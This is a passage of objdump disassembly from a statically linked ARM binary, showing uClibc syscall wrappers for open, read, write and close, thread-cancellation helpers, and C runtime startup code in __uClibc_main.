   19e74:	e1a0c000 	mov	ip, r0
   19e78:	e49d0008 	ldr	r0, [sp], #8
   19e7c:	e3a07006 	mov	r7, #6
   19e80:	ef000000 	svc	0x00000000
   19e84:	e1a07000 	mov	r7, r0
   19e88:	e1a0000c 	mov	r0, ip
   19e8c:	eb000073 	bl	1a060 <__libc_disable_asynccancel>
   19e90:	e1a00007 	mov	r0, r7
   19e94:	e8bd4080 	pop	{r7, lr}
   19e98:	e3700a01 	cmn	r0, #4096	; 0x1000
   19e9c:	31a0f00e 	movcc	pc, lr
   19ea0:	ea00023c 	b	1a798 <__syscall_error>
   19ea4:	e1a00000 	nop			; (mov r0, r0)
   19ea8:	e1a00000 	nop			; (mov r0, r0)
   19eac:	e1a00000 	nop			; (mov r0, r0)
   19eb0:	00012024 	.word	0x00012024

00019eb4 <__GI___open_nocancel>:
   19eb4:	e1a0c007 	mov	ip, r7
   19eb8:	e3a07005 	mov	r7, #5
   19ebc:	ef000000 	svc	0x00000000
   19ec0:	e1a0700c 	mov	r7, ip
   19ec4:	31a0f00e 	movcc	pc, lr
   19ec8:	ea000232 	b	1a798 <__syscall_error>
   19ecc:	e1a00000 	nop			; (mov r0, r0)

00019ed0 <__GI___libc_open>:
   19ed0:	e51fc028 	ldr	ip, [pc, #-40]	; 19eb0 <__GI___libc_close+0x70>
   19ed4:	e79fc00c 	ldr	ip, [pc, ip]
   19ed8:	e33c0000 	teq	ip, #0
   19edc:	1a000006 	bne	19efc <__GI___libc_open+0x2c>
   19ee0:	e1a0c007 	mov	ip, r7
   19ee4:	e3a07005 	mov	r7, #5
   19ee8:	ef000000 	svc	0x00000000
   19eec:	e1a0700c 	mov	r7, ip
   19ef0:	e3700a01 	cmn	r0, #4096	; 0x1000
   19ef4:	31a0f00e 	movcc	pc, lr
   19ef8:	ea000226 	b	1a798 <__syscall_error>
   19efc:	e92d408f 	push	{r0, r1, r2, r3, r7, lr}
   19f00:	eb000078 	bl	1a0e8 <__libc_enable_asynccancel>
   19f04:	e1a0c000 	mov	ip, r0
   19f08:	e8bd000f 	pop	{r0, r1, r2, r3}
   19f0c:	e3a07005 	mov	r7, #5
   19f10:	ef000000 	svc	0x00000000
   19f14:	e1a07000 	mov	r7, r0
   19f18:	e1a0000c 	mov	r0, ip
   19f1c:	eb00004f 	bl	1a060 <__libc_disable_asynccancel>
   19f20:	e1a00007 	mov	r0, r7
   19f24:	e8bd4080 	pop	{r7, lr}
   19f28:	e3700a01 	cmn	r0, #4096	; 0x1000
   19f2c:	31a0f00e 	movcc	pc, lr
   19f30:	ea000218 	b	1a798 <__syscall_error>
   19f34:	e1a00000 	nop			; (mov r0, r0)
   19f38:	e1a00000 	nop			; (mov r0, r0)
   19f3c:	e1a00000 	nop			; (mov r0, r0)
   19f40:	00011f94 	.word	0x00011f94

00019f44 <__GI___write_nocancel>:
   19f44:	e1a0c007 	mov	ip, r7
   19f48:	e3a07004 	mov	r7, #4
   19f4c:	ef000000 	svc	0x00000000
   19f50:	e1a0700c 	mov	r7, ip
   19f54:	31a0f00e 	movcc	pc, lr
   19f58:	ea00020e 	b	1a798 <__syscall_error>
   19f5c:	e1a00000 	nop			; (mov r0, r0)

00019f60 <__GI___libc_write>:
   19f60:	e51fc028 	ldr	ip, [pc, #-40]	; 19f40 <__GI___libc_open+0x70>
   19f64:	e79fc00c 	ldr	ip, [pc, ip]
   19f68:	e33c0000 	teq	ip, #0
   19f6c:	1a000006 	bne	19f8c <__GI___libc_write+0x2c>
   19f70:	e1a0c007 	mov	ip, r7
   19f74:	e3a07004 	mov	r7, #4
   19f78:	ef000000 	svc	0x00000000
   19f7c:	e1a0700c 	mov	r7, ip
   19f80:	e3700a01 	cmn	r0, #4096	; 0x1000
   19f84:	31a0f00e 	movcc	pc, lr
   19f88:	ea000202 	b	1a798 <__syscall_error>
   19f8c:	e92d408f 	push	{r0, r1, r2, r3, r7, lr}
   19f90:	eb000054 	bl	1a0e8 <__libc_enable_asynccancel>
   19f94:	e1a0c000 	mov	ip, r0
   19f98:	e8bd000f 	pop	{r0, r1, r2, r3}
   19f9c:	e3a07004 	mov	r7, #4
   19fa0:	ef000000 	svc	0x00000000
   19fa4:	e1a07000 	mov	r7, r0
   19fa8:	e1a0000c 	mov	r0, ip
   19fac:	eb00002b 	bl	1a060 <__libc_disable_asynccancel>
   19fb0:	e1a00007 	mov	r0, r7
   19fb4:	e8bd4080 	pop	{r7, lr}
   19fb8:	e3700a01 	cmn	r0, #4096	; 0x1000
   19fbc:	31a0f00e 	movcc	pc, lr
   19fc0:	ea0001f4 	b	1a798 <__syscall_error>
   19fc4:	e1a00000 	nop			; (mov r0, r0)
   19fc8:	e1a00000 	nop			; (mov r0, r0)
   19fcc:	e1a00000 	nop			; (mov r0, r0)
   19fd0:	00011f04 	.word	0x00011f04

00019fd4 <__GI___read_nocancel>:
   19fd4:	e1a0c007 	mov	ip, r7
   19fd8:	e3a07003 	mov	r7, #3
   19fdc:	ef000000 	svc	0x00000000
   19fe0:	e1a0700c 	mov	r7, ip
   19fe4:	31a0f00e 	movcc	pc, lr
   19fe8:	ea0001ea 	b	1a798 <__syscall_error>
   19fec:	e1a00000 	nop			; (mov r0, r0)

00019ff0 <__GI___libc_read>:
   19ff0:	e51fc028 	ldr	ip, [pc, #-40]	; 19fd0 <__GI___libc_write+0x70>
   19ff4:	e79fc00c 	ldr	ip, [pc, ip]
   19ff8:	e33c0000 	teq	ip, #0
   19ffc:	1a000006 	bne	1a01c <__GI___libc_read+0x2c>
   1a000:	e1a0c007 	mov	ip, r7
   1a004:	e3a07003 	mov	r7, #3
   1a008:	ef000000 	svc	0x00000000
   1a00c:	e1a0700c 	mov	r7, ip
   1a010:	e3700a01 	cmn	r0, #4096	; 0x1000
   1a014:	31a0f00e 	movcc	pc, lr
   1a018:	ea0001de 	b	1a798 <__syscall_error>
   1a01c:	e92d408f 	push	{r0, r1, r2, r3, r7, lr}
   1a020:	eb000030 	bl	1a0e8 <__libc_enable_asynccancel>
   1a024:	e1a0c000 	mov	ip, r0
   1a028:	e8bd000f 	pop	{r0, r1, r2, r3}
   1a02c:	e3a07003 	mov	r7, #3
   1a030:	ef000000 	svc	0x00000000
   1a034:	e1a07000 	mov	r7, r0
   1a038:	e1a0000c 	mov	r0, ip
   1a03c:	eb000007 	bl	1a060 <__libc_disable_asynccancel>
   1a040:	e1a00007 	mov	r0, r7
   1a044:	e8bd4080 	pop	{r7, lr}
   1a048:	e3700a01 	cmn	r0, #4096	; 0x1000
   1a04c:	31a0f00e 	movcc	pc, lr
   1a050:	ea0001d0 	b	1a798 <__syscall_error>
   1a054:	e1a00000 	nop			; (mov r0, r0)
   1a058:	e1a00000 	nop			; (mov r0, r0)
   1a05c:	e1a00000 	nop			; (mov r0, r0)

0001a060 <__libc_disable_asynccancel>:
   1a060:	e3100002 	tst	r0, #2
   1a064:	e92d40b0 	push	{r4, r5, r7, lr}
   1a068:	1a00001c 	bne	1a0e0 <__libc_disable_asynccancel+0x80>
   1a06c:	eb0001ff 	bl	1a870 <__aeabi_read_tp>
   1a070:	e510340c 	ldr	r3, [r0, #-1036]	; 0xfffffbf4
   1a074:	e2405e49 	sub	r5, r0, #1168	; 0x490
   1a078:	e3c37002 	bic	r7, r3, #2
   1a07c:	e1a04003 	mov	r4, r3
   1a080:	e1a01007 	mov	r1, r7
   1a084:	e2852084 	add	r2, r5, #132	; 0x84
   1a088:	e5923000 	ldr	r3, [r2]
   1a08c:	e1530004 	cmp	r3, r4
   1a090:	1a000005 	bne	1a0ac <__libc_disable_asynccancel+0x4c>
   1a094:	e1a00004 	mov	r0, r4
   1a098:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1a09c:	e1a0e00f 	mov	lr, pc
   1a0a0:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1a0a4:	3afffff7 	bcc	1a088 <__libc_disable_asynccancel+0x28>
   1a0a8:	e1a03004 	mov	r3, r4
   1a0ac:	e1530004 	cmp	r3, r4
   1a0b0:	0a000007 	beq	1a0d4 <__libc_disable_asynccancel+0x74>
   1a0b4:	eaffffef 	b	1a078 <__libc_disable_asynccancel+0x18>
   1a0b8:	e1a02007 	mov	r2, r7
   1a0bc:	e2850084 	add	r0, r5, #132	; 0x84
   1a0c0:	e3a01080 	mov	r1, #128	; 0x80
   1a0c4:	e3a03000 	mov	r3, #0
   1a0c8:	e3a070f0 	mov	r7, #240	; 0xf0
   1a0cc:	ef000000 	svc	0x00000000
   1a0d0:	e5957084 	ldr	r7, [r5, #132]	; 0x84
   1a0d4:	e207300c 	and	r3, r7, #12
   1a0d8:	e3530004 	cmp	r3, #4
   1a0dc:	0afffff5 	beq	1a0b8 <__libc_disable_asynccancel+0x58>
   1a0e0:	e8bd40b0 	pop	{r4, r5, r7, lr}
   1a0e4:	e12fff1e 	bx	lr

0001a0e8 <__libc_enable_asynccancel>:
   1a0e8:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   1a0ec:	e59f80c8 	ldr	r8, [pc, #200]	; 1a1bc <__libc_enable_asynccancel+0xd4>
   1a0f0:	eb0001de 	bl	1a870 <__aeabi_read_tp>
   1a0f4:	e510640c 	ldr	r6, [r0, #-1036]	; 0xfffffbf4
   1a0f8:	e2407e49 	sub	r7, r0, #1168	; 0x490
   1a0fc:	e08f8008 	add	r8, pc, r8
   1a100:	e3865002 	orr	r5, r6, #2
   1a104:	e1550006 	cmp	r5, r6
   1a108:	0a000028 	beq	1a1b0 <__libc_enable_asynccancel+0xc8>
   1a10c:	e1a01005 	mov	r1, r5
   1a110:	e2872084 	add	r2, r7, #132	; 0x84
   1a114:	e1a04006 	mov	r4, r6
   1a118:	e5923000 	ldr	r3, [r2]
   1a11c:	e1530004 	cmp	r3, r4
   1a120:	1a000005 	bne	1a13c <__libc_enable_asynccancel+0x54>
   1a124:	e1a00004 	mov	r0, r4
   1a128:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1a12c:	e1a0e00f 	mov	lr, pc
   1a130:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1a134:	3afffff7 	bcc	1a118 <__libc_enable_asynccancel+0x30>
   1a138:	e1a03004 	mov	r3, r4
   1a13c:	e1530006 	cmp	r3, r6
   1a140:	11a06003 	movne	r6, r3
   1a144:	1affffed 	bne	1a100 <__libc_enable_asynccancel+0x18>
   1a148:	e3c53044 	bic	r3, r5, #68	; 0x44
   1a14c:	e353000a 	cmp	r3, #10
   1a150:	1a000016 	bne	1a1b0 <__libc_enable_asynccancel+0xc8>
   1a154:	e3e03000 	mvn	r3, #0
   1a158:	e5873220 	str	r3, [r7, #544]	; 0x220
   1a15c:	e1a05002 	mov	r5, r2
   1a160:	e5971084 	ldr	r1, [r7, #132]	; 0x84
   1a164:	e1a02005 	mov	r2, r5
   1a168:	e1a04001 	mov	r4, r1
   1a16c:	e3811010 	orr	r1, r1, #16
   1a170:	e5923000 	ldr	r3, [r2]
   1a174:	e1530004 	cmp	r3, r4
   1a178:	1a000005 	bne	1a194 <__libc_enable_asynccancel+0xac>
   1a17c:	e1a00004 	mov	r0, r4
   1a180:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1a184:	e1a0e00f 	mov	lr, pc
   1a188:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1a18c:	3afffff7 	bcc	1a170 <__libc_enable_asynccancel+0x88>
   1a190:	e1a03004 	mov	r3, r4
   1a194:	e1530004 	cmp	r3, r4
   1a198:	1afffff0 	bne	1a160 <__libc_enable_asynccancel+0x78>
   1a19c:	e5970080 	ldr	r0, [r7, #128]	; 0x80
   1a1a0:	e59f3018 	ldr	r3, [pc, #24]	; 1a1c0 <__libc_enable_asynccancel+0xd8>
   1a1a4:	e798c003 	ldr	ip, [r8, r3]
   1a1a8:	e1a0e00f 	mov	lr, pc
   1a1ac:	e12fff1c 	bx	ip
   1a1b0:	e1a00006 	mov	r0, r6
   1a1b4:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   1a1b8:	e12fff1e 	bx	lr
   1a1bc:	0000e890 	.word	0x0000e890
   1a1c0:	00000074 	.word	0x00000074

0001a1c4 <__pthread_mutex_lock>:
   1a1c4:	e3a00000 	mov	r0, #0
   1a1c8:	e12fff1e 	bx	lr

0001a1cc <__pthread_mutex_init>:
   1a1cc:	e3a00000 	mov	r0, #0
   1a1d0:	e12fff1e 	bx	lr

0001a1d4 <_pthread_cleanup_push_defer>:
   1a1d4:	e8800006 	stm	r0, {r1, r2}
   1a1d8:	e12fff1e 	bx	lr

0001a1dc <_pthread_cleanup_pop_restore>:
   1a1dc:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1a1e0:	e3510000 	cmp	r1, #0
   1a1e4:	e24dd004 	sub	sp, sp, #4
   1a1e8:	e1a03000 	mov	r3, r0
   1a1ec:	15900004 	ldrne	r0, [r0, #4]
   1a1f0:	1593c000 	ldrne	ip, [r3]
   1a1f4:	11a0e00f 	movne	lr, pc
   1a1f8:	112fff1c 	bxne	ip
   1a1fc:	e28dd004 	add	sp, sp, #4
   1a200:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1a204:	e12fff1e 	bx	lr

0001a208 <__GI___uClibc_fini>:
   1a208:	e92d4070 	push	{r4, r5, r6, lr}
   1a20c:	e59f205c 	ldr	r2, [pc, #92]	; 1a270 <__GI___uClibc_fini+0x68>
   1a210:	e59f505c 	ldr	r5, [pc, #92]	; 1a274 <__GI___uClibc_fini+0x6c>
   1a214:	e59f305c 	ldr	r3, [pc, #92]	; 1a278 <__GI___uClibc_fini+0x70>
   1a218:	e08f5005 	add	r5, pc, r5
   1a21c:	e0623003 	rsb	r3, r2, r3
   1a220:	e1a04143 	asr	r4, r3, #2
   1a224:	e0856002 	add	r6, r5, r2
   1a228:	ea000002 	b	1a238 <__GI___uClibc_fini+0x30>
   1a22c:	e796c104 	ldr	ip, [r6, r4, lsl #2]
   1a230:	e1a0e00f 	mov	lr, pc
   1a234:	e12fff1c 	bx	ip
   1a238:	e2544001 	subs	r4, r4, #1
   1a23c:	2afffffa 	bcs	1a22c <__GI___uClibc_fini+0x24>
   1a240:	e59f3034 	ldr	r3, [pc, #52]	; 1a27c <__GI___uClibc_fini+0x74>
   1a244:	e7953003 	ldr	r3, [r5, r3]
   1a248:	e3530000 	cmp	r3, #0
   1a24c:	11a0e00f 	movne	lr, pc
   1a250:	112fff13 	bxne	r3
   1a254:	e59f3024 	ldr	r3, [pc, #36]	; 1a280 <__GI___uClibc_fini+0x78>
   1a258:	e7953003 	ldr	r3, [r5, r3]
   1a25c:	e3530000 	cmp	r3, #0
   1a260:	11a0e00f 	movne	lr, pc
   1a264:	112fff13 	bxne	r3
   1a268:	e8bd4070 	pop	{r4, r5, r6, lr}
   1a26c:	e12fff1e 	bx	lr
   1a270:	fffffff8 	.word	0xfffffff8
   1a274:	0000e774 	.word	0x0000e774
   1a278:	fffffffc 	.word	0xfffffffc
   1a27c:	000009b0 	.word	0x000009b0
   1a280:	000009b4 	.word	0x000009b4

0001a284 <__check_one_fd>:
   1a284:	e92d4030 	push	{r4, r5, lr}
   1a288:	e1a05001 	mov	r5, r1
   1a28c:	e24dd004 	sub	sp, sp, #4
   1a290:	e3a01001 	mov	r1, #1
   1a294:	e1a04000 	mov	r4, r0
   1a298:	ebffef45 	bl	15fb4 <__GI___libc_fcntl>
   1a29c:	e59f302c 	ldr	r3, [pc, #44]	; 1a2d0 <__check_one_fd+0x4c>
   1a2a0:	e3700001 	cmn	r0, #1
   1a2a4:	e08f3003 	add	r3, pc, r3
   1a2a8:	1a000005 	bne	1a2c4 <__check_one_fd+0x40>
   1a2ac:	e59f0020 	ldr	r0, [pc, #32]	; 1a2d4 <__check_one_fd+0x50>
   1a2b0:	e1a01005 	mov	r1, r5
   1a2b4:	e0830000 	add	r0, r3, r0
   1a2b8:	ebffff04 	bl	19ed0 <__GI___libc_open>
   1a2bc:	e1500004 	cmp	r0, r4
   1a2c0:	1bfff8bd 	blne	185bc <__GI_abort>
   1a2c4:	e28dd004 	add	sp, sp, #4
   1a2c8:	e8bd4030 	pop	{r4, r5, lr}
   1a2cc:	e12fff1e 	bx	lr
   1a2d0:	0000e6e8 	.word	0x0000e6e8
   1a2d4:	ffff7b84 	.word	0xffff7b84

0001a2d8 <__GI___uClibc_init>:
   1a2d8:	e92d4010 	push	{r4, lr}
   1a2dc:	e59f4040 	ldr	r4, [pc, #64]	; 1a324 <__GI___uClibc_init+0x4c>
   1a2e0:	e59f3040 	ldr	r3, [pc, #64]	; 1a328 <__GI___uClibc_init+0x50>
   1a2e4:	e08f4004 	add	r4, pc, r4
   1a2e8:	e7942003 	ldr	r2, [r4, r3]
   1a2ec:	e5923000 	ldr	r3, [r2]
   1a2f0:	e3530000 	cmp	r3, #0
   1a2f4:	1a000008 	bne	1a31c <__GI___uClibc_init+0x44>
   1a2f8:	e2833a01 	add	r3, r3, #4096	; 0x1000
   1a2fc:	e5823000 	str	r3, [r2]
   1a300:	eb000c4a 	bl	1d430 <__pthread_initialize_minimal>
   1a304:	e59f3020 	ldr	r3, [pc, #32]	; 1a32c <__GI___uClibc_init+0x54>
   1a308:	e0842003 	add	r2, r4, r3
   1a30c:	e1a03002 	mov	r3, r2
   1a310:	e3530000 	cmp	r3, #0
   1a314:	11a0e00f 	movne	lr, pc
   1a318:	112fff12 	bxne	r2
   1a31c:	e8bd4010 	pop	{r4, lr}
   1a320:	e12fff1e 	bx	lr
   1a324:	0000e6a8 	.word	0x0000e6a8
   1a328:	00000094 	.word	0x00000094
   1a32c:	ffff3110 	.word	0xffff3110

0001a330 <__uClibc_main>:
   1a330:	e24dde1a 	sub	sp, sp, #416	; 0x1a0
   1a334:	e59f4394 	ldr	r4, [pc, #916]	; 1a6d0 <__uClibc_main+0x3a0>
   1a338:	e58d2004 	str	r2, [sp, #4]
   1a33c:	e282c004 	add	ip, r2, #4
   1a340:	e592e000 	ldr	lr, [r2]
   1a344:	e59f2388 	ldr	r2, [pc, #904]	; 1a6d4 <__uClibc_main+0x3a4>
   1a348:	e08f4004 	add	r4, pc, r4
   1a34c:	e1a07101 	lsl	r7, r1, #2
   1a350:	e58d1008 	str	r1, [sp, #8]
   1a354:	e7941002 	ldr	r1, [r4, r2]
   1a358:	e59f2378 	ldr	r2, [pc, #888]	; 1a6d8 <__uClibc_main+0x3a8>
   1a35c:	e08cc007 	add	ip, ip, r7
   1a360:	e58d4000 	str	r4, [sp]
   1a364:	e7944002 	ldr	r4, [r4, r2]
   1a368:	e15c000e 	cmp	ip, lr
   1a36c:	e59d21a8 	ldr	r2, [sp, #424]	; 0x1a8
   1a370:	e584c000 	str	ip, [r4]
   1a374:	059dc004 	ldreq	ip, [sp, #4]
   1a378:	e5812000 	str	r2, [r1]
   1a37c:	e59d5000 	ldr	r5, [sp]
   1a380:	e59d11a4 	ldr	r1, [sp, #420]	; 0x1a4
   1a384:	e59f2350 	ldr	r2, [pc, #848]	; 1a6dc <__uClibc_main+0x3ac>
   1a388:	e1a06003 	mov	r6, r3
   1a38c:	008c3007 	addeq	r3, ip, r7
   1a390:	e7851002 	str	r1, [r5, r2]
   1a394:	e58d000c 	str	r0, [sp, #12]
   1a398:	e3a01000 	mov	r1, #0
   1a39c:	05843000 	streq	r3, [r4]
   1a3a0:	e28d0f4a 	add	r0, sp, #296	; 0x128
   1a3a4:	e3a02078 	mov	r2, #120	; 0x78
   1a3a8:	ebfff148 	bl	168d0 <__GI_memset>
   1a3ac:	e5941000 	ldr	r1, [r4]
   1a3b0:	ea000000 	b	1a3b8 <__uClibc_main+0x88>
   1a3b4:	e2811004 	add	r1, r1, #4
   1a3b8:	e5913000 	ldr	r3, [r1]
   1a3bc:	e3530000 	cmp	r3, #0
   1a3c0:	1afffffb 	bne	1a3b4 <__uClibc_main+0x84>
   1a3c4:	e2814004 	add	r4, r1, #4
   1a3c8:	e28d5f4a 	add	r5, sp, #296	; 0x128
   1a3cc:	ea000005 	b	1a3e8 <__uClibc_main+0xb8>
   1a3d0:	e353000e 	cmp	r3, #14
   1a3d4:	90850183 	addls	r0, r5, r3, lsl #3
   1a3d8:	91a01004 	movls	r1, r4
   1a3dc:	93a02008 	movls	r2, #8
   1a3e0:	9bfff132 	blls	168b0 <__GI_memcpy>
   1a3e4:	e2844008 	add	r4, r4, #8
   1a3e8:	e5943000 	ldr	r3, [r4]
   1a3ec:	e3530000 	cmp	r3, #0
   1a3f0:	1afffff6 	bne	1a3d0 <__uClibc_main+0xa0>
   1a3f4:	e28d0f4a 	add	r0, sp, #296	; 0x128
   1a3f8:	eb000c0f 	bl	1d43c <_dl_aux_init>
   1a3fc:	ebffffb5 	bl	1a2d8 <__GI___uClibc_init>
   1a400:	e59f32d8 	ldr	r3, [pc, #728]	; 1a6e0 <__uClibc_main+0x3b0>
   1a404:	e59de000 	ldr	lr, [sp]
   1a408:	e59d215c 	ldr	r2, [sp, #348]	; 0x15c
   1a40c:	e79e1003 	ldr	r1, [lr, r3]
   1a410:	e59d3184 	ldr	r3, [sp, #388]	; 0x184
   1a414:	e3520000 	cmp	r2, #0
   1a418:	03a02a01 	moveq	r2, #4096	; 0x1000
   1a41c:	e3730001 	cmn	r3, #1
   1a420:	e5812000 	str	r2, [r1]
   1a424:	1a000009 	bne	1a450 <__uClibc_main+0x120>
   1a428:	eb0001c1 	bl	1ab34 <__GI_getuid>
   1a42c:	e1a04000 	mov	r4, r0
   1a430:	eb00018d 	bl	1aa6c <__GI_geteuid>
   1a434:	e1540000 	cmp	r4, r0
   1a438:	1a00000e 	bne	1a478 <__uClibc_main+0x148>
   1a43c:	eb00018f 	bl	1aa80 <__GI_getgid>
   1a440:	e1a04000 	mov	r4, r0
   1a444:	eb000183 	bl	1aa58 <__GI_getegid>
   1a448:	e1540000 	cmp	r4, r0
   1a44c:	1a000009 	bne	1a478 <__uClibc_main+0x148>
   1a450:	e59d2184 	ldr	r2, [sp, #388]	; 0x184
   1a454:	e3720001 	cmn	r2, #1
   1a458:	0a000010 	beq	1a4a0 <__uClibc_main+0x170>
   1a45c:	e59d318c 	ldr	r3, [sp, #396]	; 0x18c
   1a460:	e1520003 	cmp	r2, r3
   1a464:	1a000003 	bne	1a478 <__uClibc_main+0x148>
   1a468:	e59d2194 	ldr	r2, [sp, #404]	; 0x194
   1a46c:	e59d319c 	ldr	r3, [sp, #412]	; 0x19c
   1a470:	e1520003 	cmp	r2, r3
   1a474:	0a000009 	beq	1a4a0 <__uClibc_main+0x170>
   1a478:	e59f4264 	ldr	r4, [pc, #612]	; 1a6e4 <__uClibc_main+0x3b4>
   1a47c:	e3a00000 	mov	r0, #0
   1a480:	e3a01902 	mov	r1, #32768	; 0x8000
   1a484:	ebffff7e 	bl	1a284 <__check_one_fd>
   1a488:	e3a00001 	mov	r0, #1
   1a48c:	e1a01004 	mov	r1, r4
   1a490:	ebffff7b 	bl	1a284 <__check_one_fd>
   1a494:	e1a01004 	mov	r1, r4
   1a498:	e3a00002 	mov	r0, #2
   1a49c:	ebffff78 	bl	1a284 <__check_one_fd>
   1a4a0:	e59d0004 	ldr	r0, [sp, #4]
   1a4a4:	e59f323c 	ldr	r3, [pc, #572]	; 1a6e8 <__uClibc_main+0x3b8>
   1a4a8:	e5902000 	ldr	r2, [r0]
   1a4ac:	e59d1000 	ldr	r1, [sp]
   1a4b0:	e7812003 	str	r2, [r1, r3]
   1a4b4:	e5904000 	ldr	r4, [r0]
   1a4b8:	e3540000 	cmp	r4, #0
   1a4bc:	0a00000d 	beq	1a4f8 <__uClibc_main+0x1c8>
   1a4c0:	e59f3224 	ldr	r3, [pc, #548]	; 1a6ec <__uClibc_main+0x3bc>
   1a4c4:	e7913003 	ldr	r3, [r1, r3]
   1a4c8:	e5834000 	str	r4, [r3]
   1a4cc:	e3a0102f 	mov	r1, #47	; 0x2f
   1a4d0:	e5900000 	ldr	r0, [r0]
   1a4d4:	eb000a4d 	bl	1ce10 <__GI_strrchr>
   1a4d8:	e59f3210 	ldr	r3, [pc, #528]	; 1a6f0 <__uClibc_main+0x3c0>
   1a4dc:	e59d5000 	ldr	r5, [sp]
   1a4e0:	e3500000 	cmp	r0, #0
   1a4e4:	e7952003 	ldr	r2, [r5, r3]
   1a4e8:	12803001 	addne	r3, r0, #1
   1a4ec:	e5820000 	str	r0, [r2]
   1a4f0:	15823000 	strne	r3, [r2]
   1a4f4:	05824000 	streq	r4, [r2]
   1a4f8:	e59f21f4 	ldr	r2, [pc, #500]	; 1a6f4 <__uClibc_main+0x3c4>
   1a4fc:	e59f31f4 	ldr	r3, [pc, #500]	; 1a6f8 <__uClibc_main+0x3c8>
   1a500:	e59dc000 	ldr	ip, [sp]
   1a504:	e0623003 	rsb	r3, r2, r3
   1a508:	e1a07143 	asr	r7, r3, #2
   1a50c:	e08c5002 	add	r5, ip, r2
   1a510:	e59f31e4 	ldr	r3, [pc, #484]	; 1a6fc <__uClibc_main+0x3cc>
   1a514:	e59d21a0 	ldr	r2, [sp, #416]	; 0x1a0
   1a518:	e3a04000 	mov	r4, #0
   1a51c:	e78c2003 	str	r2, [ip, r3]
   1a520:	ea000003 	b	1a534 <__uClibc_main+0x204>
   1a524:	e795c104 	ldr	ip, [r5, r4, lsl #2]
   1a528:	e1a0e00f 	mov	lr, pc
   1a52c:	e12fff1c 	bx	ip
   1a530:	e2844001 	add	r4, r4, #1
   1a534:	e1540007 	cmp	r4, r7
   1a538:	3afffff9 	bcc	1a524 <__uClibc_main+0x1f4>
   1a53c:	e3560000 	cmp	r6, #0
   1a540:	11a0e00f 	movne	lr, pc
   1a544:	112fff16 	bxne	r6
   1a548:	e59f21b0 	ldr	r2, [pc, #432]	; 1a700 <__uClibc_main+0x3d0>
   1a54c:	e59f31b0 	ldr	r3, [pc, #432]	; 1a704 <__uClibc_main+0x3d4>
   1a550:	e59de000 	ldr	lr, [sp]
   1a554:	e0623003 	rsb	r3, r2, r3
   1a558:	e1a07143 	asr	r7, r3, #2
   1a55c:	e08e5002 	add	r5, lr, r2
   1a560:	e3a04000 	mov	r4, #0
   1a564:	ea000003 	b	1a578 <__uClibc_main+0x248>
   1a568:	e795c104 	ldr	ip, [r5, r4, lsl #2]
   1a56c:	e1a0e00f 	mov	lr, pc
   1a570:	e12fff1c 	bx	ip
   1a574:	e2844001 	add	r4, r4, #1
   1a578:	e1540007 	cmp	r4, r7
   1a57c:	3afffff9 	bcc	1a568 <__uClibc_main+0x238>
   1a580:	e59f3180 	ldr	r3, [pc, #384]	; 1a708 <__uClibc_main+0x3d8>
   1a584:	e59d0000 	ldr	r0, [sp]
   1a588:	e0802003 	add	r2, r0, r3
   1a58c:	e1a03002 	mov	r3, r2
   1a590:	e3530000 	cmp	r3, #0
   1a594:	0a000003 	beq	1a5a8 <__uClibc_main+0x278>
   1a598:	e1a0e00f 	mov	lr, pc
   1a59c:	e12fff12 	bx	r2
   1a5a0:	e3a03000 	mov	r3, #0
   1a5a4:	e5803000 	str	r3, [r0]
   1a5a8:	e59f315c 	ldr	r3, [pc, #348]	; 1a70c <__uClibc_main+0x3dc>
   1a5ac:	e59d1000 	ldr	r1, [sp]
   1a5b0:	e7912003 	ldr	r2, [r1, r3]
   1a5b4:	e1a03002 	mov	r3, r2
   1a5b8:	e3530000 	cmp	r3, #0
   1a5bc:	0a000003 	beq	1a5d0 <__uClibc_main+0x2a0>
   1a5c0:	e1a0e00f 	mov	lr, pc
   1a5c4:	e12fff12 	bx	r2
   1a5c8:	e3a03000 	mov	r3, #0
   1a5cc:	e5803000 	str	r3, [r0]
   1a5d0:	e28d0010 	add	r0, sp, #16
   1a5d4:	eb00009c 	bl	1a84c <_setjmp>
   1a5d8:	e3500000 	cmp	r0, #0
   1a5dc:	1a000012 	bne	1a62c <__uClibc_main+0x2fc>
   1a5e0:	eb0000a2 	bl	1a870 <__aeabi_read_tp>
   1a5e4:	e2402e49 	sub	r2, r0, #1168	; 0x490
   1a5e8:	e5923080 	ldr	r3, [r2, #128]	; 0x80
   1a5ec:	e59d4000 	ldr	r4, [sp]
   1a5f0:	e58d3118 	str	r3, [sp, #280]	; 0x118
   1a5f4:	e59f30dc 	ldr	r3, [pc, #220]	; 1a6d8 <__uClibc_main+0x3a8>
   1a5f8:	e794c003 	ldr	ip, [r4, r3]
   1a5fc:	e5103414 	ldr	r3, [r0, #-1044]	; 0xfffffbec
   1a600:	e58d311c 	str	r3, [sp, #284]	; 0x11c
   1a604:	e28d3010 	add	r3, sp, #16
   1a608:	e5823080 	str	r3, [r2, #128]	; 0x80
   1a60c:	e59d1004 	ldr	r1, [sp, #4]
   1a610:	e59d0008 	ldr	r0, [sp, #8]
   1a614:	e59c2000 	ldr	r2, [ip]
   1a618:	e59d500c 	ldr	r5, [sp, #12]
   1a61c:	e1a0e00f 	mov	lr, pc
   1a620:	e12fff15 	bx	r5
   1a624:	e1a01000 	mov	r1, r0
   1a628:	ea000026 	b	1a6c8 <__uClibc_main+0x398>
   1a62c:	e59f30dc 	ldr	r3, [pc, #220]	; 1a710 <__uClibc_main+0x3e0>
   1a630:	e59dc000 	ldr	ip, [sp]
   1a634:	e79cc003 	ldr	ip, [ip, r3]
   1a638:	e1a0e00f 	mov	lr, pc
   1a63c:	e12fff1c 	bx	ip
   1a640:	e59f30cc 	ldr	r3, [pc, #204]	; 1a714 <__uClibc_main+0x3e4>
   1a644:	e59de000 	ldr	lr, [sp]
   1a648:	e79e7003 	ldr	r7, [lr, r3]
   1a64c:	e5971000 	ldr	r1, [r7]
   1a650:	e1a02007 	mov	r2, r7
   1a654:	e1a04001 	mov	r4, r1
   1a658:	e2411001 	sub	r1, r1, #1
   1a65c:	e5923000 	ldr	r3, [r2]
